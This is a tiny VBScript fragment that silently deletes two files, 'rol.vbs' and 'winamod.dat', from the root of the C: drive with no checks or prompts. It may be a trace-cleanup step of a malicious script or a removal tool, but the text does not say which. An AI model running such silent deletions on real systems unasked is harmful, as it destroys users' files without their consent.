set sss=createobject("scripting.filesystemobject")
sss.DeleteFile "c:\rol.vbs"
sss.DeleteFile "c:\winamod.dat"
